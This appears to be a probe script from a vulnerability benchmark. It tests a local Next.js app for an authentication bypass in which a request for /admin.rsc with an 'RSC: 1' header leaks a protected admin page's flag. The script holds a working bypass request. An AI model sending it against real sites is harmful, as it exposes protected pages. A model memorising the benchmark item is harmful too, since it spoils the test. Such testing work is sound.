#!/usr/bin/env python3
"""Method-side executable probe for nextjs-cve-2026-45109.
Usage: python3 seed_exec.py <candidate.json> [version]

Probe = unauthenticated GET /admin (control; the middleware auth gate must 401) +
GET <candidate path> (default /admin.rsc) with the RSC:1 header (the App Router
transport variant). The protected /admin page renders the per-run ${PCB_FLAG};
success == the flag leaks in the transport-variant response body.

Seed and residual use the SAME request; the differentiator is the BUILD pipeline
(webpack vs Turbopack), which scripts/verify.sh selects by pointing
PCB_TARGET_PORT at the right service (seed -> v0 / v1_web, residual -> v1_turbo).
"""
import json
import os
import sys
import time
import urllib.error
import urllib.request

BASE = {
    "v0": "http://127.0.0.1:41090",
    "v1": "http://127.0.0.1:41091",
}


def _get(base, path, headers=None, timeout=20):
    req = urllib.request.Request(base.rstrip("/") + path, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return -1, "ERR:%s" % e


def run_probe(candidate, *, version="v1"):
    base = BASE[version]
    path = candidate.get("path", "/admin.rsc") if isinstance(candidate, dict) else "/admin.rsc"
    headers = dict(candidate.get("headers", {}) or {}) if isinstance(candidate, dict) else {}
    headers.setdefault("RSC", "1")
    # 就绪重试：Next.js 冷启动较慢，先等 control（/admin 401）可连再探测
    c_status, c_body = -1, ""
    for _ in range(12):
        c_status, c_body = _get(base, "/admin")
        if c_status != -1:
            break
        time.sleep(5)
    b_status, b_body = _get(base, path, headers)
    return {
        "version": version,
        "probe_id": candidate.get("probe_id") if isinstance(candidate, dict) else None,
        "path": path,
        "control_status": c_status,
        "bypass_status": b_status,
        "body": b_body,
    }


# 平台动态端口覆盖（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
    if r.get("bypass_status") == -1:
        sys.exit(2)  # 连接失败 = 环境失败（20），区别于 10=效果未发生
